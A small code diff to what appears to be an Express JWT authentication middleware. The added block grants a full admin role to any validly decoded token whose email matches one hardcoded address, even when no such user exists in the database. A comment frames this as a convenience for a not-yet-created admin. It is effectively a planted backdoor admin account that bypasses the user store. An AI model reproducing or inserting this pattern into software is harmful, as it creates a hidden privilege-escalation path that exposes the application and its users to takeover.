@@ -20,6 +20,18 @@ export const protect = async (req, res, next) => {
       const user = await User.findById(decoded.id).select('-password');
 
       if (!user) {
+        // Special case for admin user that might not exist in database yet
+        if (decoded.email === "outzen@gmail.com") {
+          console.log('✅ Special admin user authenticated');
+          req.user = {
+            id: decoded.id,
+            name: "Admin User",
+            email: "outzen@gmail.com",
+            role: "admin"
+          };
+          return next();
+        }
+
         console.error('❌ User not found for token');
         return res.status(401).json({
           success: false,
